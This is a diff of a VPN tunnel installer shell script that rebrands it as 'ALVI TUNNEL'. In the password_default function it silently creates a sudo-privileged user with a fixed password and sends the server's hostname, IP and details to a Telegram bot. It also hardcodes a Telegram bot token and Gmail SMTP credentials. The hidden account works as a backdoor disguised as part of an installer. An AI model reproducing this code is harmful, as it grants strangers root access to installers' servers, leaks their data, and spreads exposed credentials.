@@ -246,7 +246,7 @@ else
 fi
 }
 
-# GEO PROJECT
+# ALVI TUNNEL
 clear
 function nginx_install() {
     # // Checking System
@@ -333,18 +333,18 @@ function password_default() {
     domain=$(cat /root/domain)
     MYIP=$(curl -sS ipv4.icanhazip.com)
     userdel jame > /dev/null 2>&1
-    Username="kyt"
-    Password=kyt
+    Username="sensor 🥷"
+    Password="sensor 🥷"
     mkdir -p /home/script/
     useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="1156078455"
+    CHATID="-1001896637875"
     KEY="6676451249:AAFC5J7CSeYIXmpOS-6WP3n5-b7mqh9hVN8"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT="Installasi VPN Script Stable V3.0
+    TEXT="🥷🥷Informasi instal script🥷🥷
     ============================
     <code>Tanggal    :</code> <code>$tanggal</code>
     <code>Hostname   :</code> <code>${HOSTNAME}</code>
@@ -362,7 +362,7 @@ function password_default() {
     <code>User Script:</code> <code>$username</code>
     <code>Exp Script :</code> <code>$exp</code>
     ============================
-    (C) Copyright 2023 By ALVI TUNNEL
+    (C) Copyright 2023 By ALVI TUNNEL 🥷🥷
     ============================
 "
 
@@ -806,9 +806,9 @@ account default
 host smtp.gmail.com
 port 587
 auth on
-user oceantestdigital@gmail.com
-from oceantestdigital@gmail.com
-password jokerman77 
+user alvibackup9@gmail.com
+from alvibackup9@gmail.com
+password wbgqpokjbkkjjiet 
 logfile ~/.msmtp.log
 EOF
 chown -R www-data:www-data /etc/msmtprc
